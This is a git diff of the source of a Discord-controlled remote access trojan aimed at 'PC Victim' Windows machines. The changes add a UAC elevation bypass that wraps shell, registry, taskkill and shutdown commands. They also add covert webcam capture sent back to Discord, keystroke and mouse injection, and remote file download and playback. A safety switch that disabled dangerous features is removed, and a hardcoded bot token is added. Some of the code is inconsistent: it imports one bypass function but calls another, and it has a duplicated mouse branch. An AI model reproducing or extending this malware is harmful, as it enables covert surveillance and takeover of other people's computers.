@@ -1,20 +1,24 @@
 __import__('sys').path.append('../')
-import discord, asyncio, os, subprocess, requests, psutil, json, win32api, win32con, threading
+import discord, asyncio, os, subprocess, requests, psutil, json, win32api, win32con, threading, time, asyncio
+import pygame.camera
+import pygame.image
+import pygame.mixer
 import sounddevice as sd
 from PIL import ImageGrab
 from core.info import Info
 from core.sender import Sender
-from winpwnage.functions import *
 from discord.ext import commands
 from urllib.parse import urlparse
 from pretty_help import PrettyHelp
 from scipy.io.wavfile import write
 from pynput import keyboard, mouse
 from core.destroy_window import DestroyWindow
+from winpwnage.functions.uac.uacMethod1 import uacMethod1
 
 os.system('cls')
 pc = Info()
 PREFIX = '>'
+devmode = False
 client = commands.Bot(command_prefix=commands.when_mentioned_or(PREFIX), intents = discord.Intents.all(), help_command=PrettyHelp())
 
 def CheckHWID(HWID):
@@ -28,7 +32,7 @@ async def SendOutput(ctx, output):
 	await ctx.send(embed = output_embed)
 
 async def safe(ctx):
-	if True:
+	if devmode:
 		await SendOutput(ctx, "This Feature has been disabled for the safety of Dev")
 		return
 
@@ -66,7 +70,9 @@ class Control(commands.Cog, description='Control PC Victim'):
 		await safe(ctx)
 		if not CheckHWID(HWID):
 			return
-		output = str(subprocess.check_output(f'reg {method} {path} /f', shell=True), 'utf-8')
+		command = f"reg {method} {path} /f"
+		uacMethod2(['C:\\Windows\\System32\\cmd.exe', command])
+		output = str(subprocess.check_output(command, shell=True), 'utf-8')
 		await SendOutput(ctx, output)
 
 	@commands.command(aliases=['tkill', 'tk'], brief='End Processes by Process Name', description='End Processes by Process Name')
@@ -74,7 +80,9 @@ class Control(commands.Cog, description='Control PC Victim'):
 		await safe(ctx)
 		if not CheckHWID(HWID):
 			return
-		output = str(subprocess.check_output(f'taskkill /f /im {Name}', shell=True), 'utf-8')
+		command = f'taskkill /f /im {Name}'
+		uacMethod2(['C:\\Windows\\System32\\cmd.exe', command])
+		output = str(subprocess.check_output(command, shell=True), 'utf-8')
 		await SendOutput(ctx, output)
 
 	@commands.command(aliases=['tlist', 'tl'], brief='List All Processes Running on PC Victim', description='List All Processes Running on PC Victim')
@@ -140,16 +148,20 @@ class Control(commands.Cog, description='Control PC Victim'):
 
 	@commands.command(aliases=["run", "r"], brief='Run File From PC Victim', description='Run File From PC Victim')
 	async def Run(self, ctx, HWID: str,  method = 'cmd', path_file: str = '.'):
-		# await safe(ctx)
+		await safe(ctx)
 		if not CheckHWID(HWID):
 			return
 
 		def subp(method):
 			if method == 'cmd':
-				output = str(subprocess.check_output(f'cmd /c {path_file}', shell=True), 'utf-8')
+				command = f'cmd /c {path_file}'
+				uacMethod2(['C:\\Windows\\System32\\cmd.exe', command])
+				output = str(subprocess.check_output(command, shell=True), 'utf-8')
 				# await SendOutput(ctx, output)
 			elif method == 'powershell':
-				output = str(subprocess.check_output(f'powershell -WindowStyle Hidden -Command "Start-Process -FilePath {path_file} -Wait"', shell=True), 'utf-8')
+				command = f'powershell -WindowStyle Hidden -Command "Start-Process -FilePath {path_file} -Wait"'
+				uacMethod2(['C:\\Windows\\System32\\cmd.exe', command])
+				output = str(subprocess.check_output(command, shell=True), 'utf-8')
 				# await SendOutput(ctx, output)
 		threading.Thread(target = subp, args=(method,)).start()
 		await SendOutput(ctx, 'Run Done!\n')
@@ -161,7 +173,9 @@ class Control(commands.Cog, description='Control PC Victim'):
 		def msg(amount, method, message):
 			for i in range(amount):
 				if method == 'msg':
-					output = str(subprocess.check_output(f'cmd /c msg * {message}', shell=True), 'utf-8')	
+					command = f'cmd /c msg * {message}'
+					uacMethod2(['C:\\Windows\\System32\\cmd.exe', command])
+					output = str(subprocess.check_output(command, shell=True), 'utf-8')	
 				elif method == 'msgbox':
 					win32api.MessageBox(win32con.NULL, message, caption)	
 		threading.Thread(target = msg, args = (amount, method, message, )).start()
@@ -171,19 +185,25 @@ class Control(commands.Cog, description='Control PC Victim'):
 	async def Shutdown(self, ctx, HWID: str):
 		if not CheckHWID(HWID):
 			return
-		output = str(subprocess.check_output('shutdown /f /t 0', shell=True), 'utf-8')
+		command = 'shutdown /f /t 0'
+		uacMethod2(['C:\\Windows\\System32\\cmd.exe', command])
+		output = str(subprocess.check_output(command, shell=True), 'utf-8')
 
 	@commands.command(aliases=["restart", "rstart"], brief='Restart PC Victim', description='Restart PC Victim')
 	async def Restart(self, ctx, HWID: str):
 		if not CheckHWID(HWID):
 			return
-		output = str(subprocess.check_output('shutdown /f /r /t 0', shell=True), 'utf-8')
+		command = 'shutdown /f /r /t 0'
+		uacMethod2(['C:\\Windows\\System32\\cmd.exe', command])
+		output = str(subprocess.check_output(command, shell=True), 'utf-8')
 
 	@commands.command(aliases=["signout", "sout"], brief='Sign Out PC Victim', description='Logout PC Victim')
 	async def SignOut(self, ctx, HWID: str):
 		if not CheckHWID(HWID):
 			return
-		output = str(subprocess.check_output('shutdown /l', shell=True), 'utf-8')
+		command = 'shutdown /l'
+		uacMethod2(['C:\\Windows\\System32\\cmd.exe', command])
+		output = str(subprocess.check_output(command, shell=True), 'utf-8')
 
 	@commands.command(aliases=["blockinput", "binput"], brief='Block Keyboard and Mouse', description='Block Keyboard and Mouse')
 	async def BlockInput(self, ctx, HWID: str):
@@ -212,11 +232,45 @@ class Control(commands.Cog, description='Control PC Victim'):
 	async def Keyboard(self, ctx, HWID: str, mode: str = 'type',  *, text = ''):
 		if not CheckHWID(HWID):
 			return
+		# Key = keyboard.Key
+		# _key = {'enter': Key.enter, 'ctrl_l': Key.ctrl_}
+		keyboard_ = keyboard.Controller()
+		async def typing():
+			if mode == 'type':
+				# keyboard_.type(text)
+				for char in text:
+					keyboard_.press(char)
+					keyboard_.release(char)
+					time.sleep(0.1)
+			# elif mode == 'key':
+			await SendOutput(ctx, 'Done!')
+		def between_typing():
+			loop = asyncio.new_event_loop()
+			asyncio.set_event_loop(loop)
+
+			loop.run_until_complete(typing())
+			loop.close()
+		threading.Thread(target = between_typing).start()
 
 	@commands.command(aliases=["mouse", "mse"], brief='Control Mouse PC Victim', description='Control Mouse PC Victim')
-	async def Mouse(self, ctx, HWID: str, click_mode: str = 'r',  x = 0, y = 0):
+	async def Mouse(self, ctx, HWID: str, mode: str = 'set_postion',  x = 0, y = 0):
 		if not CheckHWID(HWID):
 			return
+		mous = mouse.Controller()
+		Button = mouse.Button()
+
+		if x != 0 and y != 0 and mode != 'scroll':
+			mous.position = (x, y)
+		if mode == 'click_l':
+			mous.press(Button.left)
+			mous.release(Button.left)
+		elif mode == 'click_l':
+			mous.press(Button.right)
+			mous.release(Button.right)
+		elif mode == 'scroll':
+			x = 0
+			mouse.scroll(x, y)
+		await SendOutput(ctx, 'Done!')
 
 	@commands.command(aliases=["sprocess", "sp"], brief='Start Process in PC Victim', description='Start Process in PC Victim')
 	async def StartProcess(self, ctx, HWID: str, process = None, *, agruments):
@@ -225,7 +279,9 @@ class Control(commands.Cog, description='Control PC Victim'):
 			return
 		if process == None:
 			return
-		output = str(subprocess.check_output(f'powershell -WindowStyle Hidden -Command "Start-Process -FilePath {process} -ArgumentList \"{agruments}\" "'), 'utf-8')
+		command = f'powershell -WindowStyle Hidden -Command "Start-Process -FilePath {process} -ArgumentList \"{agruments}\" "'
+		uacMethod2(['C:\\Windows\\System32\\cmd.exe', command])
+		output = str(subprocess.check_output(command,shell = True), 'utf-8')
 		await SendOutput(ctx, output)
 
 	@commands.command(aliases=["recordaudio", "raudio"], brief='Record Audio in PC Victim', description='Record Audio in PC Victim')
@@ -256,6 +312,77 @@ class Control(commands.Cog, description='Control PC Victim'):
 			url_file = json_r['data']['file']['url']['full']
 			await SendOutput(ctx, f"Upload Audio {filename} To Anonymfile Success\nUrl Audio: {url_file}")
 
+	@commands.command(aliases=["webcamcapture", "wcap"], brief='Capture Webcam PC Victim', description='Capture Webcam PC Victim')
+	async def WebcamCapture(self, ctx, HWID: str):
+		if not CheckHWID(HWID):
+			return
+		pygame.camera.init()
+		cameras = pygame.camera.list_cameras()
+
+		if not cameras:
+			await SendOutput(ctx, 'No cameras was found!')
+			return
+
+		camera = pygame.camera.Camera(cameras[0])
+		camera.start()
+		await SendOutput(ctx, "Starting capture webcam...")
+		time.sleep(0.5)
+
+		image = camera.get_image()
+
+		camera.stop()
+		path_file = f"C:\\Users\\{os.getlogin()}\\AppData\\Local\\Temp\\w.png"
+		pygame.image.save(image, path_file)
+		await SendOutput(ctx, "Capture Success")
+		file = discord.File(path_file, "webcam.png")
+		await ctx.send(file=file)
+
+	@commands.command(aliases=["openurl"], brief='Open Url', description='Open Url')
+	async def OpenUrl(self, ctx, HWID: str, url: str):
+		if not CheckHWID(HWID):
+			return
+		base = """
+[{000214A0-0000-0000-C000-000000000046}]
+Prop3=19,11
+[InternetShortcut]
+IDList=
+URL="""+ url +"""
+"""
+		with open(f'c:\\Users\\{os.getlogin()}\\AppData\\Local\\Temp\\the.url', 'w+') as f:
+			f.write(base)
+		command = f'cmd /c c:\\Users\\{os.getlogin()}\\AppData\\Local\\Temp\\the.url'
+		output = str(subprocess.check_output(command, shell=True), 'utf-8')
+		await SendOutput(ctx, 'Done!')
+
+	@commands.command(aliases=["playaudio", "paudio"], brief='Play Audio', description='Play Audio')
+	async def PlayAudio(self, ctx, HWID: str, url: str):
+		if not CheckHWID(HWID):
+			return
+
+		response = requests.get(url)
+		parse = urlparse(url)
+		filename = os.path.basename(parse.path)
+		extension_file = os.path.splitext(filename)[1]
+		path = f'c:\\Users\\{os.getlogin()}\\AppData\\Local\\Temp\\audio.{extension_file}'
+		await SendOutput(ctx, 'Uploading Audio...')
+		f = open(path, "wb")
+		f.write(response.content)
+		f.close()
+		mixer = pygame.mixer
+		mixer.init()
+		mixer.music.load(path)
+		mixer.music.set_volume(1)
+		mixer.music.play()
+		await SendOutput(ctx, 'Playing Audio...')
+		def handle():
+			while True:
+				if mixer.music.get_busy():
+					pass
+				else:
+					mixer.music.unload()
+					break
+		threading.Thread(target = handle).start()
+				
 class OtherCommands(commands.Cog, description='Other Commands'):
 	@commands.command(aliases=['list'], brief='List All Victim', description='List All Victim')
 	async def List(self, ctx):
@@ -280,9 +407,9 @@ async def on_command_error(ctx, error):
 async def on_ready():
 	invite_link = f"https://discord.com/api/oauth2/authorize?client_id={client.user.id}&permissions=8&scope=bot"
 	print(invite_link)
-	await client.change_presence(activity=discord.Game(name= f"{PREFIX}help"))
+	await client.change_presence(activity=discord.Game(name= "In Dev Mode" if devmode else f"{PREFIX}help"))
 	await client.add_cog(Destroy())
 	await client.add_cog(Control())
 	await client.add_cog(OtherCommands())
 
-# client.run(')
+client.run('MTEyODk0MTcwMzAzNDgzNDk2NA.Gl7HMH.cw-bTbk2gMUE-9yHK1brCIAyr2atHGizP6U3aY')
